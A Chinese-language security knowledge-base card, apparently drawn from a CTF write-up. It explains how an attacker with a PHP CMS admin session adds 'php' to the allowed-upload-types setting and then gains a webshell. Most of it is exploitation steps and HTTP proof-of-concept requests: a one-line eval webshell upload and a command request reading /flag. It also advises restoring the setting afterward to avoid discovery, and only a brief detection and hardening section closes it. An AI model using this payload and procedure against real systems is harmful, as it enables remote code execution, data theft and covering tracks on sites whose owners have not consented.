---
id: web-generic-file-upload-admin-upload-type-setting-append-php
title: 后台「允许上传文件类型」配置追加 php：管理面自身成为白名单扩容入口
type: scenario
domain: web
path: web/generic/file-upload
technique: admin-upload-type-config-append-php-whitelist
tags:
- file-upload
- whitelist
- admin
- configuration
- php
- webshell
- cms
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:39:14+08:00'
  notes: 已对照原文与图21/22/23/24核对：图21 为 BEESCMS 网站系统设置→附件设置→「允许上传的文件类型(用|分割)」文本框，值 zip|gz|rar|iso|doc|xls|ppt|wps|swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|php（末尾 php，与卡内原值逐字一致）；图22 admin_file_upload.php 上传页、图23 响应表格回显 ../upload/file/1-20240804153453.php、图24 连接该路径读 /flag 均一致。未验证点：原文未说明 php 是默认已含还是攻击者追加（截图显示已含），卡内表述为「追加 |php」，按原文小节「系统设置加一个 php 后缀」保留；未复跑上传；原文未给 CMS 版本，未设 affected_versions。
url: /docs/web/generic/file-upload/web-generic-file-upload-admin-upload-type-setting-append-php/
draft: false
kb_aliases:
- 系统设置加 php 后缀
- 上传白名单配置持久化
- 后台允许上传类型
- 管理面扩白名单 getshell
- 上传类型设置 getshell
---

## 一句话结论

当后台「网站系统设置 → 附件设置 → 允许上传的文件类型」把白名单渲染成一个可编辑的文本框（`zip|gz|rar|iso|doc|xls|ppt|wps|swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|php` 这类 `|` 分隔串）并写入配置表时，攻入后台的攻击者不需要任何上传绕过技巧：直接把 `php` 追加进这个字符串保存，再回到普通上传接口上传 `.php` 文件，校验依据已被改成允许，脚本落到 Web 目录即可执行。

## 原理

- 这类 CMS 的上传校验通常是「读配置里的扩展名白名单 → 取上传文件名后缀 → `in_array`/`strpos` 比对」，白名单是数据而非代码，因此**谁有权限改这条配置，谁就等价于拥有「上传任意脚本」的能力**。
- 后台设置页把配置项原样回填到表单，提交时整串覆盖写入（如 `config` 表或 `settings.php`）；追加一个 `|php` 不会破坏其它类型，也不会触发任何「危险扩展名」二次校验，因为校验只看串里有没有该后缀。
- 落地的 `.php` 位于 Web 可访问目录（如 `/upload/file/<日期>/xxx.php`），Web 服务器按后缀交给 PHP 解析，直接执行；响应里的上传结果表格会回显完整相对路径，方便直接请求。
- 之所以成立：安全边界被放在「后台配置」这一信任域里，而攻击者在拿到后台会话后已经跨过该边界；配置项的修改没有审计、没有二次确认、没有「危险后缀」黑名单兜底，等于管理面自己提供了白名单扩容入口。
- 与代码层绕过的区别：`::$DATA`、尾空格、大小写、`filename` 截断这些技巧针对的是**不能改配置**时的校验缺陷；本卡针对的是「能改配置」时的配置即权限问题，两者互补。

## 触发条件

- 攻击者已获得后台管理员会话（弱口令、SQL 注入伪造管理员、越权等）。
- 后台存在「上传类型/附件设置/系统设置」等可编辑白名单的配置项，保存后即时生效（无缓存或缓存可清除）。
- 存在普通上传接口读取同一配置做校验，且文件落到 Web 可访问目录。
- Web 服务器按后缀解析脚本（`.php` 由 PHP-FPM/Apache 处理），目录无 `open_basedir`/`disable_functions` 级别的额外拦截。

## 利用步骤

1. 登录后台，进入系统设置，定位「允许上传的文件类型」配置项，确认它是 `|` 分隔的可编辑串（记录原值便于还原）。
2. 在原串末尾追加 `|php`（或 `|php5|phtml`），保存；若有缓存，点「清除缓存」使配置重新加载。
3. 访问上传页面，确认提示文案已同步显示 php（说明配置生效）。
4. 构造一个最小 webshell（如 `<?php eval($_POST['pass']);?>`），以 `1.php` 为文件名通过 multipart 上传。
5. 从响应表格中取出回显的相对路径（如 `../upload/file/1-20240804153453.php`），拼成绝对 URL 请求，用密码参数执行命令。
6. 读取目标文件（如 `/flag`、配置、数据库口令），必要时再上传功能更全的 webshell；结束后把配置串改回原值以降低被发现概率。

## PoC

```text
# 后台设置页原值
zip|gz|rar|iso|doc|xls|ppt|wps|swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|php
                                                            ^^^ 追加这一段
```

```http
POST /admin/admin_file_upload.php HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin session>
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryX

--WebKitFormBoundaryX
Content-Disposition: form-data; name="up"; filename="1.php"
Content-Type: application/octet-stream

<?php eval($_POST['pass']);?>
--WebKitFormBoundaryX
Content-Disposition: form-data; name="file_info"

1
--WebKitFormBoundaryX
Content-Disposition: form-data; name="uppic"

1
--WebKitFormBoundaryX--
```

```text
# 响应表格里回显落地路径
../upload/file/1-20240804153453.php
```

```http
POST /upload/file/1-20240804153453.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

pass=system('cat /flag');
```

## 变体与关联

- 变体：配置项不是白名单而是黑名单（`禁止上传类型`）时，把 `php` 从黑名单里删掉，效果相同。
- 变体：白名单存在数据库但页面有缓存/OPcache，需要「清除缓存」或等缓存过期；也可直接改模板/配置文件的写接口。
- 变体：只允许图片类型时，追加 `phtml`/`php5`/`pHp` 等变体，配合服务器对多后缀的解析顺序。
- 关联：`[[web-generic-file-upload-upload-allow-param-whitelist-bypass]]` 是把白名单放在**请求参数**里（`allow=php`）的同类缺陷；`[[web-generic-file-upload-user-controlled-filename-webshell]]` 是完全不校验后缀；本卡是「白名单持久化在后台配置」的形态。
- 边界：配置只读（如 `settings.php` 无写权限）、保存后需重启才生效且无重启权限、上传目录不可执行脚本、`open_basedir` 限制落地目录时降级为任意文件写。

## 检测与防御

- 检测：后台配置项出现 `php`/`phtml`/`jsp`/`asp` 等脚本后缀；配置变更日志与上传日志在时间上紧邻；上传目录出现脚本文件并被请求执行。
- 修复：上传白名单在服务端代码中硬编码，不提供后台编辑入口；必须可配时，对配置值做「危险后缀」强制剔除并二次确认。
- 加固：上传目录与 Web 可执行目录分离，脚本解析只允许指定目录；配置文件写入审计与告警；对后台配置变更加二次鉴权（如重新输入口令）。
